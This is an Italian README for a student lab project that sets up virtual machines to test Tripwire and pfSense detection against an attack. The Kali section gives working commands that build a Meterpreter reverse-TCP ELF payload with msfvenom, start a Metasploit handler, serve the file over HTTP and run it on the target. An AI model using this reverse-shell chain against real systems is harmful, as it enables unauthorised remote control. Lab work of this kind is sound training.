

# ProjectAdvancedCybersecurity
Il seguente repository ha lo scopo di illustrare come configurare una rete di macchine virtuali al fine di testare alcuni software legati alla sicurezza informatica. L' architettura viene riportata in figura.

![Architettura](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Screened-Network.drawio.png)

Le macchine virtuali sono le seguenti: 
 - **Target**: Ubuntu 22.04.2 LTS (con installato *Tripwire*)
 - **Attacker**: Kali 2023.1 (con installato *python3*)
 - **Firewall**: Pfsense 2.6.0 (con i pacchetti *Squid* e *Snort*)

Di seguito verranno esplicitati tutti i passi sia per simulare uno scenario di attacco a cui la nostra infrastruttura dovrà rispondere.
> Nota: nel repository si trovano le macchine già configurate (potrebbero esserci delle differenze nell'assegnazione degli indirizzi IP alle varie interfacce di rete o in ulteriori parametri)

***mettere configurazione adpter 

## Kali Attacker
Per effettuare l'attacco la macchina kali necessita di avere installato python3. 
```bash
sudo  apt update &&  sudo  apt upgrade -y
```
```bash
sudo apt install python3
```
Fatto ciò  si può procedere ad effettuare un attacco di reverse shell TCP verso la macchina target tramite *Metasploit*. Aprire 4 terminali:

 1. **Terminale**: Ottenere indirizzo ip dell'interfaccia di rete della macchina kali 
 ```bash
ifconfig
```
 
 2. **Terminale**: Creare il pacchetto malevolo (eseguibile)
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.18 LPORT=4444 -f elf -o Desktop/payloads/shell-x86.elf
```
Analizziamo i vari parametri:

-   _msfvenom_: il nome del programma principale, metasploit
-   _-p_: il payload da inserire. Può essere uno scritto da noi o, più comodamente, uno già presente in Metasploit.
-   _LHOST_: l'indirizzo IP al quale l'app infettata si connetterà. Può essere un indirizzo locale come un indirizzo esterno.
-   _LPORT_: la porta da utilizzare. Quella di default è proprio la 4444.
-  _-f_: formato del pacchetto
-   _-o_: il percorso dove andremo a salvare l'applicazione ricompilata, contenente il payload.

 3. **Terminale**: Ora dobbiamo essere pronti per accettare la connessione, quindi prepariamo una sessione attraverso metasplot.
```bash
msfconsle
```
Una volta aperta la console:
```bash
msf6> use multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.18
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse handler on 192.168.1.18:4444
[*] Starting the payload handler...
```
Una volta che la vittima avrà installato ed eseguito il file *.elf*  verrà aperta una sessione con una reverse shell che permetterà alla macchina kali infettare il target. Come esempio è stato eseguito un cambio di permessi ad una cartella
 ```bash
meterpreter > sudo chmod o+x ./DirectoryTarget
```

 4. **Terminale**: Per far ricevere il pacchetto alla macchina target viene esposto un web server al quale sarà possibile scaricare il file *shell-x86.elf*. (prima entrare nella cartella in cui è il file)
```bash
cd Desktop/payloads
sudo python -m http.server 80
```

## Ubuntu Target
Nella macchina target la prima cosa da fare è installare Tripwire che ci permetterà di rilevare l'attacco compiuto dall'attaccante
```bash
sudo apt-get update
sudo apt-get install tripwire
```
Lasciando inalterate le impostazioni di configurazione di default, Tripwire ti chiederà di creare due chiavi.

-   **site key** : questa chiave viene utilizzata per proteggere i file di configurazione. Dobbiamo assicurarci che i file di configurazione non vengano modificati, altrimenti non ci si può fidare del nostro intero sistema di rilevamento. 
    
-   **local key** : questa chiave viene utilizzata su ogni macchina per eseguire i binari. Ciò è necessario per garantire che i nostri file binari non vengano eseguiti senza il nostro consenso.

>  Nota: assicurati di scegliere passphrase non facilmente deducibili

 1.Inizializzare il database 
----------

Ora possiamo inizializzare il database che tripwire utilizzerà per convalidare il nostro sistema. Questo utilizza il file delle policy e controlla i punti specificati all'interno. Poiché questo file non è stato ancora personalizzato per il nostro sistema, avremo molti avvisi, falsi positivi ed errori. Useremo questi come riferimento per mettere a punto il nostro file di configurazione. Il modo di base per inizializzare il database è eseguendo:

```bash
sudo tripwire --init
```

Questo creerà il nostro file di database e genererà alcuni *warnings* che dobbiamo regolare nella configurazione.  Possiamo eseguire il comando `check` e posizionare i file elencati in un file chiamato `test_results`nella nostra directory di configurazione di tripwire:

```bash
sudo sh -c 'tripwire --check | grep Filename > test_results'
```

Se esaminiamo questo file, dovremmo vedere voci simili a questa:

```bash
less /etc/tripwire/test_results
```
```bash
Filename: /etc/rc.boot
Filename: /root/mail
Filename: /root/Mail
Filename: /root/.xsession-errors
. . .
```
2.Configurazione file delle policy 
----------

Ora che abbiamo un elenco di file che attivano tripwire, possiamo esaminare il nostro file di policy e modificarlo per eliminare questi falsi positivi. Apri il file *twpol.txt* nel tuo editor con i privilegi di root:
```bash
sudo nano /etc/tripwire/twpol.txt
```
Eseguire una ricerca per ciascuno dei file restituiti in`test_results`. Commenta tutte le righe che trovi corrispondenti. Fatto ciò, crea una nuova regola, dandogli un nome e un livello di gravità: `severity = $(SIG_HI)`.  Nel corpo verranno indicate le directory o i file a quali verrà applicata la regola che in questo caso è `$(SEC_INVARIANT) (recurse = 0)`; ossia non sono tollerati cambi di permessi o di proprietà nel primo livello della directory.

![rule](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Tripwire%20rule.png)

Salva e chiudi il file al termine delle modifiche. Ora che il nostro file è configurato, dobbiamo implementarlo ricreando il file di policy crittografato che tripwire effettivamente legge:

```bash
sudo twadmin -m P /etc/tripwire/twpol.txt
```
Dopo che questo è stato creato, dobbiamo reinizializzare il database per implementare la nostra politica:

```bash
sudo tripwire --init
```
```
Please enter your local passphrase:
Parsing policy file: /etc/tripwire/tw.pol
Generating the database...
*** Processing Unix File System ***
Wrote database file: /var/lib/tripwire/tripit.twd
The database was successfully generated.
```
3.Predisposizione all'attacco
----------
Per far si che la macchina target subisca l'attacco è necessario che scaricare l'eseguibile esposto dalla macchina kali attraverso il web server. Dunque, collegandosi all'indirizzo `192.128.1.28/ 80` è possibile scaricare il file ed eseguirlo tramite i seguenti comandi: 
```bash
sudo chmod +x ./shell-x86.elf ##Concediamo diritti per esecuzione
./shell-x86.elf ##Esecuzione
```
Fatto ciò la macchina sarà infetta. Una volta avvenuto l'attacco lanciando il comando 
```bash
sudo tripwire --check 
```
inizierà la procedura di verifica la quale restituisce il seguente report di output:

![report](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Tripwire%20detect.png)

## Pfsense Firewall
L'ultima macchina virtuale da inserire all'interno della reta sarà Pfsense, un distribuzione firewall open-source basata sul sistema operativo FreeBSD. Una volta finita la configurazione iniziale della macchina (opzioni di default), il primo step da affrontare è quello di impostare un nuovo indirizzo IP all'interfaccia di rete LAN. In generale, l'indirizzo che viene attribuito può essere quello del router domestico (es: 192.168.1.1) o potrebbe non essere impostato. Dunque per impostarne uno manualmente (es: 192.168.1.2) basterà attivare il menù dedicato inviando il tasto `2`

![pfsensemenu](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Pfsense%20menu.png)

Fatto ciò, nella macchina target sarà possibile impostare come gateway tale interfaccia: 
```bash
sudo ip route add default via 192.168.1.2
```
 permettendo così a Pfsense di interporsi tra il router e la macchina Ubuntu. 
 
 1.Configurazione Pfsense
----------
Dalla macchina  Ubuntu attraverso un qualsiasi web browser sarà possibile accedere alla GUI per la configurazione di Pfsense (`http://192.168.1.2`) inserendo le credenziali di default: 

 - **Username**: *admin*
 - **Password**: *pfsense*

## Autori

- [Mattia Scuriatti](https://github.com/Me77y99)
- [Gatti Giada](https://github.com/S1090231)

